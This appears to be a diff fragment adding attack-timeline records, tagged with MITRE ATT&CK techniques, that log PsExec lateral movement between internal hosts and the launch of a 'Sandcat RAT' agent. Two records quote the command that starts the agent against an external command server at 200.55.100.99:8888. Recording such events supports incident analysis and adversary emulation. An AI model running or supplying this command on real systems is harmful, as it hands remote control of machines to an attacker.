+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_28"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.164.54",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200524408",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:45:56",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_23",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.162.21",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783107105552",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:46:34",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_23"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.162.21",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783107130098",
+      "title": " Lateral Movement",
+      "date": "2026-06-19",
+      "time": "15:49:29",
+      "tactic": "Lateral Movement",
+      "action": "T1021.002, T1569.002, T1550.003",
+      "desc": "",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_26",
+        "node_1781103832634_22"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": " 10.125.164.52",
+        "DstIP": "10.125.162.20",
+        "Port": "",
+        "Protocol": "",
+        "ProcName": " PsExec.exe",
+        "ProcID": ""
+      }
+    },
+    {
+      "id": "1783200546690",
+      "title": "Sandcat RAT",
+      "date": "2026-06-19",
+      "time": "15:49:29",
+      "tactic": "Execution",
+      "action": "T1059.003, T1071.001",
+      "desc": "cmd /c start C:\\Windows\\Temp\\sandcat.go-windows -server http://200.55.100.99:8888 -v",
+      "raw": "",
+      "nodes": [
+        "node_1781103832634_22",
+        "node_1781106366501"
+      ],
+      "type": "remote_action",
+      "eventType": "Network",
+      "eventData": {
+        "SrcIP": "10.125.162.20",
+        "DstIP": "200.55.100.99",
+        "Port": "8888",
+        "Protocol": "HTTP",
+        "ProcName": "sandcat.go-windows",
+        "ProcID": ""
+      }
+    }
+  ],
+  "reports": []
+}
